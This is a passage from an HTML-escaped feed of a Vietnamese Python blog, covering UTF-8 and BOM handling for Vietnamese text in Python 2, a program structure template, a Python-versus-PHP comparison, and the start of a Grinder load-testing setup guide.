&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;h\xe1\xba\xa1 v\xc3\xb4 \xc4&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;chuỗi s[7:17] là chuỗi què. byte cuối cùng của chuỗi này &lt;tt class="docutils literal"&gt;\xc4&lt;/tt&gt; mới là một nửa của chữ cái &lt;tt class="docutils literal"&gt;đ&lt;/tt&gt; (&lt;tt class="docutils literal"&gt;'\xc4\x91'&lt;/tt&gt;), vì vậy mọi thao tác của bạn trên chuỗi này có tiềm năng gặp lỗi. chẳng hạn:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gt"&gt;Traceback (most recent call last):&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &lt;span class="n"&gt;&amp;lt;module&amp;gt;&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;/usr/lib/python2.6/encodings/utf_8.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;16&lt;/span&gt;, in &lt;span class="n"&gt;decode&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utf_8_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gr"&gt;UnicodeDecodeError&lt;/span&gt;: &lt;span class="n"&gt;&amp;#39;utf8&amp;#39; codec can&amp;#39;t decode byte 0xc4 in position 9: unexpected end of data&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;u&amp;#39;h\u1ea1 v\xf4 &amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Unicode áp dụng cho s[7:16] thì vô tư vì nó không bị què.&lt;/p&gt;
&lt;p&gt;Việc đọc các file text utf8 cũng gặp tình huống tương tự. Chẳng hạn thao tác sau tiềm năng gặp lỗi:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong tình huống này bạn cố gắng đọc 1000 byte đầu tiên của file, &lt;tt class="docutils literal"&gt;s&lt;/tt&gt; có thể là chuỗi tiếng Việt bị què như tình huống ở trên.&lt;/p&gt;
&lt;p&gt;Đọc ghi file dữ liệu tiếng Việt. File chứa dữ liệu dạng văn bản tiếng Việt thường được ghi dưới dạng unicode hoặc utf8. Đoạn chương trình sau đọc nội dung utf8:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;ff = open(&amp;quot;anyfile&amp;quot;, &amp;#39;r&amp;#39;)&lt;/span&gt;
&lt;span class="go"&gt;content = ff.read()&lt;/span&gt;
&lt;span class="go"&gt;ff.close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Dữ liệu tiếng Việt lưu dưới dạng utf8 thường có BOM_UTF8 (= &lt;tt class="docutils literal"&gt;&amp;quot;\xef\xbb\xbf&amp;quot;&lt;/tt&gt;) ở đầu file. Bạn phải loại bỏ cái này trước khi có thể làm cái gì đó. Đoạn chương trình sau làm việc này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;codecs&lt;/span&gt;

&lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;anyfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BOM_UTF8&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Chú ý rằng đoạn chương trình trên không thích hợp cho việc xử lý các file lớn (hơn 200MB). Với các file lớn bạn cần chia nhỏ thành các file nhỏ hơn.&lt;/p&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;codecs&lt;/tt&gt; là thư viện chứa rất nhiều BOM.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;BOM&amp;#39;, &amp;#39;BOM32_BE&amp;#39;, &amp;#39;BOM32_LE&amp;#39;, &amp;#39;BOM64_BE&amp;#39;, &amp;#39;BOM64_LE&amp;#39;, &amp;#39;BOM_BE&amp;#39;, &amp;#39;BOM_LE&amp;#39;, &amp;#39;BOM_UTF16&amp;#39;, &amp;#39;BOM_UTF16_BE&amp;#39;, &amp;#39;BOM_UTF16_LE&amp;#39;, &amp;#39;BOM_UTF32&amp;#39;,&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;BOM_UTF32_BE&amp;#39;, &amp;#39;BOM_UTF32_LE&amp;#39;, &amp;#39;BOM_UTF8&amp;#39;, ...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Dùng thư viện &lt;tt class="docutils literal"&gt;codecs&lt;/tt&gt; bạn có thể nhanh chóng đọc nội dung file mà không mất nhiều công biến đổi encoding. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# đọc toàn bộ nội dung của file vào content,&lt;/span&gt;
&lt;span class="c1"&gt;# nội dung của file được biết trước như là utf8,&lt;/span&gt;
&lt;span class="c1"&gt;# content sẽ là nội dung unicode.&lt;/span&gt;
&lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;your file name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# mặc định đọc toàn bộ nội dung của file vào content&lt;/span&gt;
&lt;span class="c1"&gt;# (dạng mặc định là utf8)&lt;/span&gt;
&lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;your file name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ghi dữ liệu tiếng Việt ra file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ở đây &lt;tt class="docutils literal"&gt;content&lt;/tt&gt; là chuỗi utf8, nếu bạn đưa vào &lt;tt class="docutils literal"&gt;content&lt;/tt&gt; là dạng unicode, nó sẽ được tự động chuyển về dạng utf8 trước khi được ghi ra file.&lt;/p&gt;
</content><category term="codec"></category><category term="utf"></category><category term="unicode"></category><category term="vietnamese"></category></entry><entry><title>Cấu trúc đơn giản của một chương trình Python</title><link href="/2009/05/cau-truc-don-gian-cua-mot-chuong-trinh-python.html" rel="alternate"></link><published>2009-05-19T01:09:00+07:00</published><updated>2009-05-19T01:09:00+07:00</updated><author><name>Phạm Thị Minh Hoài</name></author><id>tag:None,2009-05-19:/2009/05/cau-truc-don-gian-cua-mot-chuong-trinh-python.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class="c1"&gt;# Bạn có thể comment bằng tiếng Việt có dấu thoải mái. Hãy dùng tín hiệu ở&lt;/span&gt;
&lt;span class="c1"&gt;# dòng trên để báo cho các Editor biết được đây là file utf8.&lt;/span&gt;

&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; đây là cách thức được dùng để viết docstring cho một khối &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Viết thêm cái …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class="c1"&gt;# Bạn có thể comment bằng tiếng Việt có dấu thoải mái. Hãy dùng tín hiệu ở&lt;/span&gt;
&lt;span class="c1"&gt;# dòng trên để báo cho các Editor biết được đây là file utf8.&lt;/span&gt;

&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; đây là cách thức được dùng để viết docstring cho một khối &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Viết thêm cái này cho nó đẹp&lt;/span&gt;

&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;#-----------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="sd"&gt;# Name:        Module Name&lt;/span&gt;
&lt;span class="sd"&gt;#&lt;/span&gt;
&lt;span class="sd"&gt;# Purpose:&lt;/span&gt;
&lt;span class="sd"&gt;#&lt;/span&gt;
&lt;span class="sd"&gt;# Version:     1.1&lt;/span&gt;
&lt;span class="sd"&gt;#&lt;/span&gt;
&lt;span class="sd"&gt;# Author:&lt;/span&gt;
&lt;span class="sd"&gt;#&lt;/span&gt;
&lt;span class="sd"&gt;# Created:     13/01/2009&lt;/span&gt;
&lt;span class="sd"&gt;# Updated:     30/04/2009&lt;/span&gt;
&lt;span class="sd"&gt;#&lt;/span&gt;
&lt;span class="sd"&gt;# Copyright:   (c) YourCompany&lt;/span&gt;
&lt;span class="sd"&gt;#&lt;/span&gt;
&lt;span class="sd"&gt;# Todo:&lt;/span&gt;
&lt;span class="sd"&gt;#-----------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Import các thư viện&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;xml&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sax&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="c1"&gt;# Khai báo và triển khai các lớp&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;YourClass&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Đặt các mô tả về lớp ở đây&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Viết một cái gì đó để giải thích nếu cần thiết &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

        &lt;span class="c1"&gt;# KHÔNG nên viết quá 3 lệnh python trên một dòng, chương trình&lt;/span&gt;
        &lt;span class="c1"&gt;# của bạn sẽ rất khó hiểu.&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;

        &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="c1"&gt;# KHÔNG nên viết một dòng Python dài hơn 80 ký tự&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;Test&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="c1"&gt;# Các lập trình viên python thường dùng cách này để test module&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;Test&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
</content><category term="structure"></category></entry><entry><title>Python và PHP</title><link href="/2009/01/python-va-php.html" rel="alternate"></link><published>2009-01-30T03:01:00+07:00</published><updated>2009-01-30T03:01:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2009-01-30:/2009/01/python-va-php.html</id><summary type="html">&lt;p&gt;Bài viết này được tổng hợp từ nhiều nguồn khác nhau (bằng tiếng anh) cộng với kinh nghiệm viết PHP và Python của tôi.&lt;/p&gt;
&lt;div class="section" id="i-giong-nhau"&gt;
&lt;h2&gt;I. Giống nhau&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Là ngôn ngữ cao cấp, thông dịch và định kiểu động&lt;/li&gt;
&lt;li&gt;Mã nguồn mở&lt;/li&gt;
&lt;li&gt;Cộng đồng lập trình viên rộng lớn&lt;/li&gt;
&lt;li&gt;Dễ học …&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Bài viết này được tổng hợp từ nhiều nguồn khác nhau (bằng tiếng anh) cộng với kinh nghiệm viết PHP và Python của tôi.&lt;/p&gt;
&lt;div class="section" id="i-giong-nhau"&gt;
&lt;h2&gt;I. Giống nhau&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Là ngôn ngữ cao cấp, thông dịch và định kiểu động&lt;/li&gt;
&lt;li&gt;Mã nguồn mở&lt;/li&gt;
&lt;li&gt;Cộng đồng lập trình viên rộng lớn&lt;/li&gt;
&lt;li&gt;Dễ học (so với Java, C hay Perl)&lt;/li&gt;
&lt;li&gt;Dễ mở rộng (so với Java, C++)&lt;/li&gt;
&lt;li&gt;Rất khả chuyển, chạy được trên nhiều nền tảng mà không phải biên dịch lại (tất nhiên rồi) hay sửa code&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="ii-khac-nhau"&gt;
&lt;h2&gt;II. Khác nhau&lt;/h2&gt;
&lt;div class="section" id="php-hon"&gt;
&lt;h3&gt;1. PHP hơn&lt;/h3&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;PHP kế thừa các curly braces để đánh dấu code block của C và dấu &lt;tt class="docutils literal"&gt;$&lt;/tt&gt; của Perl&lt;/li&gt;
&lt;li&gt;Các câu lệnh &lt;tt class="docutils literal"&gt;switch&lt;/tt&gt; và vòng lặp &lt;tt class="docutils literal"&gt;do/while&lt;/tt&gt;&lt;/li&gt;
&lt;li&gt;Toán tử gán, increment và decrement (&lt;tt class="docutils literal"&gt;++&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;--&lt;/span&gt;&lt;/tt&gt;)&lt;/li&gt;
&lt;li&gt;Toán tử ternary operator/statement (&lt;tt class="docutils literal"&gt;… ? … : …&lt;/tt&gt;)
* Trong Python 2.5 có câu lệnh &lt;tt class="docutils literal"&gt;if/else&lt;/tt&gt; có tác dụng tương tự (&lt;tt class="docutils literal"&gt;X if C else Y&lt;/tt&gt;)&lt;/li&gt;
&lt;li&gt;Array rất mạnh, dùng cho cả list và dict&lt;/li&gt;
&lt;li&gt;Tham chiếu (&lt;tt class="docutils literal"&gt;$a =&amp;amp; $b&lt;/tt&gt; tức là khi biến &lt;tt class="docutils literal"&gt;$b&lt;/tt&gt; thay đổi, thì biến &lt;tt class="docutils literal"&gt;$a&lt;/tt&gt; cũng thay đổi)&lt;/li&gt;
&lt;li&gt;Có cả private, protected và public access modifiers cho cả phương thức và thuộc tính&lt;/li&gt;
&lt;li&gt;Dùng cả abstract và final modifiers cho cả classes và methods&lt;/li&gt;
&lt;li&gt;Có interfaces&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;$this&lt;/tt&gt; là đối tượng mặc định, và không cần truyền ngược &lt;tt class="docutils literal"&gt;self&lt;/tt&gt; để định nghĩa method như Python (với Python, để định nghĩa &lt;tt class="docutils literal"&gt;test&lt;/tt&gt; là method của một lớp cần định nghĩa: &lt;tt class="docutils literal"&gt;def test(self)&lt;/tt&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="python-hon"&gt;
&lt;h3&gt;2. Python hơn&lt;/h3&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Ngôn ngữ sử dụng với các mục đích chung (Python có thể dùng để lập trình hầu hết mọi thứ, trong khi PHP chỉ dùng để lập trình web hay console. Tất nhiên có thể làm được việc khác nhưng không đáng kể)&lt;/li&gt;
&lt;li&gt;Sử dụng indentation (thụt vào đầu dòng, và dòng mới) thay thế cho các dấu curly braces để đánh dấu các code block. Tất nhiên là trông đẹp hơn, nhưng không thân thiện với HTML template cho Web)&lt;/li&gt;
&lt;li&gt;Có namespaces và modules (PHP 5.3 mới có namespaces)&lt;/li&gt;
&lt;li&gt;Truyền biến cho hàm hiệu quả hơn PHP nhờ cặp &lt;tt class="docutils literal"&gt;key=value&lt;/tt&gt; pair, hỗ trợ tốt hơn cho giá trị mặc định của biến truyền vào hàm&lt;/li&gt;
&lt;li&gt;Cho phép đa thừa kế (không rõ là hay hay là dở nữa)&lt;/li&gt;
&lt;li&gt;Introspection tốt hơn PHP Reflection&lt;/li&gt;
&lt;li&gt;Mọi thứ từ biến tới đối tượng đều có kiểu tham chiếu&lt;/li&gt;
&lt;li&gt;Có Threading&lt;/li&gt;
&lt;li&gt;Document tốt hơn PHP (nhưng chắc chắn là ít tài liệu trên mạng hơn PHP)&lt;/li&gt;
&lt;li&gt;Có thể lập trình GUI (Tất nhiên là PHP cũng có thể nhưng không thể bằng)&lt;/li&gt;
&lt;li&gt;Có thể chạy trên .Net với IronPython hay nền Java với Jython (PHP cũng có thể chạy trên Java thậm chí trong cả các Application Server)&lt;/li&gt;
&lt;li&gt;Có web server, application server riêng, 100% viết bằng Python.&lt;/li&gt;
&lt;li&gt;Có lambda và các hàm hỗ trợ để xây dựng hàm (PHP có create_function và closure)&lt;/li&gt;
&lt;li&gt;Cached byte-code (PHP cũng có nhưng không tốt bằng)&lt;/li&gt;
&lt;li&gt;Unicode được hỗ trợ tốt hơn&lt;/li&gt;
&lt;li&gt;Kiểm soát lỗi ngoại lệ tốt hơn&lt;/li&gt;
&lt;li&gt;Chạy nhanh hơn PHP (nhanh hơn nhưng tốn CPU và RAM)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Hãy học Python cho đời còn lại của bạn nhé!&lt;/p&gt;
&lt;p&gt;(Bài viết được chuyển từ diễn đàn do bạn kaka đóng góp)&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</content><category term="python"></category><category term="comparison"></category><category term="php"></category></entry><entry><title>Grinder - Java load testing framework</title><link href="/2007/11/grinder-java-load-testing-framework.html" rel="alternate"></link><published>2007-11-29T21:14:00+07:00</published><updated>2007-11-29T21:14:00+07:00</updated><author><name>Lê Ngọc Hiếu</name></author><id>tag:None,2007-11-29:/2007/11/grinder-java-load-testing-framework.html</id><summary type="html">&lt;p&gt;Những người làm phần mềm hẳn ai cũng đã biết đến công đoạn rất quan trọng sau khi thành phẩm là &amp;quot;kiểm thử&amp;quot; (test). Một trong những kiểu kiểm thử (test case) cần phải làm là kiểm thử khả năng chịu đựng của hệ thống (load test). Có một công …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Những người làm phần mềm hẳn ai cũng đã biết đến công đoạn rất quan trọng sau khi thành phẩm là &amp;quot;kiểm thử&amp;quot; (test). Một trong những kiểu kiểm thử (test case) cần phải làm là kiểm thử khả năng chịu đựng của hệ thống (load test). Có một công cụ rất mạnh để tự động hóa quá trình này, tiết kiệm thời gian và công sức cho đội kiểm thử đó là Grinder.&lt;/p&gt;
&lt;div class="section" id="gioi-thieu"&gt;
&lt;h2&gt;Giới thiệu&lt;/h2&gt;
&lt;p&gt;Tại sao lại là &lt;a class="reference external" href="http://grinder.sourceforge.net"&gt;Grinder&lt;/a&gt; mà không phải là một công cụ nào khác? Đơn giản là vì Grinder sử dụng Jython - Python chạy trên nền Java - một sự kết hợp tuyệt vời của một ngôn ngữ rất mềm dẻo, mạnh mẽ (Python) với một khung nền có thể chạy trên mọi hệ điều hành (Java).&lt;/p&gt;
&lt;p&gt;Grinder bao gồm 3 thành phần:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Console: đây là thành phần đóng vai trò điều khiển và tiếp nhận kết quả kiểm thử trả về.&lt;/li&gt;
&lt;li&gt;Agent process: đây là thành phần nhận lệnh từ Console và điều khiển các worker process.&lt;/li&gt;
&lt;li&gt;Worker process: đây là các kịch bản kiểm thử do người dùng định nghĩa.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Như vậy, tại máy dùng để theo dõi và hiển thị kết quả kiểm thử, chạy Console. Tại các máy trạm chịu trách nhiệm chạy các kịch bản kiểm thử, chạy Agent process. Các kịch bản kiểm thử sẽ được tự động chuyển về cho các Agent process từ Console khi người dùng ra lệnh chạy.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="chuan-bi"&gt;
&lt;h2&gt;Chuẩn bị&lt;/h2&gt;
&lt;p&gt;Để chạy được Grinder cần phải cài đặt các biến môi trường trỏ về đúng thư mục cài đặt Grinder và các thành phần liên quan.&lt;/p&gt;
&lt;div class="section" id="doi-voi-windows"&gt;
&lt;h3&gt;Đối với Windows&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;Tạo tập tin kịch bản gọi mõi khi chạy &lt;tt class="docutils literal"&gt;setGrinderEnv.cmd&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nv"&gt;GRINDERPATH&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;(full path to grinder install directory)
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nv"&gt;GRINDERPROPERTIES&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;(full path to grinder.properties)\grinder.properties
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nv"&gt;CLASSPATH&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;%GRINDERPATH%&lt;/span&gt;\lib\grinder.jar;&lt;span class="nv"&gt;%CLASSPATH%&lt;/span&gt;
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nv"&gt;JAVA_HOME&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;(full path to java install directory)
